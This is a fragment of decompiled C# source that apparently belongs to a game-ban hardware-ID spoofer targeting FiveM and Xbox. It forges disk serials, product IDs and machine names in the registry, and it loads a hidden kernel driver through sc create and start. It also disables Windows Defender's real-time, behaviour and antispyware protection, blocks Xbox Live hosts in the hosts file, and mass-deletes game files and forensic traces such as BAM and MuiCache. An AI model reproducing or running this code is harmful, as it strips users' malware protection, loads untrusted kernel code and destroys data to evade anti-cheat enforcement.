				File.Delete("C:\\Program Files\\Win64\\net.bat");
				return;
			}
			string text = "C:\\Program Files\\Win64\\net.bat";
			using (StreamWriter streamWriter = File.CreateText(text))
			{
				streamWriter.WriteLine("netsh int ip reset");
			}
			Process process = new Process();
			process.StartInfo.FileName = text;
			list.Add(process);
			File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
			process.Start();
			Thread.Sleep(500);
			File.Delete("C:\\Program Files\\Win64\\net.bat");
		}

		public static void HWIDclick()
		{
			string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			_ = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
			string value = "{LeanOnTop-" + "72597" + "-" + "62482" + "-" + "4194" + "-" + "844193755" + "}";
			Registry.SetValue(keyName, "GUID", value);
			Registry.SetValue(keyName, "HwProfileGuid", value);
		}

		public static void XBOXclick()
		{
			string value = "40438d3e";
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
			registryKey.SetValue("InstallDate", value);
		}

		public static void IDclick()
		{
			string value = "EBB39" + "-" + "DAA7F" + "-" + "ABA35" + "-" + "FE4BE";
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
		}

		public static void PCclick()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", writable: true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + "2129BA");
			registryKey.Close();
		}

		public static void Diskclick()
		{
			string[] subKeyNames = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				string[] subKeyNames2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames();
				foreach (string text2 in subKeyNames2)
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text + "\\" + text2 + "\\Target Id 0\\Logical Unit Id 0", writable: true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = "XB0L95MV9YE3IR";
						string value2 = "XB0L95MV9YE3IR";
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
		}

		public static void FiveM()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", recursive: true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", recursive: true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", recursive: true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", recursive: true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			if (Directory.Exists(folderPath2 + "\\CitizenFX"))
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", recursive: true);
			}
		}

		private static void bi()
		{
			bj("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
			Thread.Sleep(600);
			bj("sc start Win32x64_0");
			bj("sc stop Win32x64_0");
			bj("sc delete Win32x64_0");
			File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
		}

		private static void bj(string a)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + a)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			_ = process.ExitCode;
			process.Close();
		}

		private void bk(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("Append Completion", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("AutoSuggest", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", writable: true).DeleteValue("EnableAutoTray", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", throwOnMissingSubKey: false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", throwOnMissingSubKey: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("AutoEndTasks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("HungAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("WaitToKillAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("LowLevelHooksTimeout", throwOnMissingValue: false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoLowDiskSpaceChecks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("LinkResolveIgnoreLinkInfo", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveSearch", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveTrack", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoInternetOpenWith", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", throwOnMissingSubKey: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			try
			{
				if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
				{
					Directory.Delete("C:\\Program Files (x86)\\Blade Group");
					Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
				}
				d d = new d();
				d.b();
			}
			catch
			{
			}
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
